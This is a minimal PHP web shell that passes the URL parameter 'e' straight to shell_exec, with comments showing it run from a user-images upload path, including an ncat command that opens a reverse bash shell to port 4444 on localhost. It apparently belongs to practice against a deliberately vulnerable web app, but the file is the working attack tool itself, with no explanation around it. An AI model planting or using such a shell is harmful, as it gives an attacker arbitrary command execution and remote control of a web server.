<?php echo shell_exec($_GET['e'].' 2>&1');

//dev-vulnerable_webapp/cmd.php?e=pwd
//user_images/cmd.php?e=ncat -e /bin/bash 127.0.0.1 4444
?>
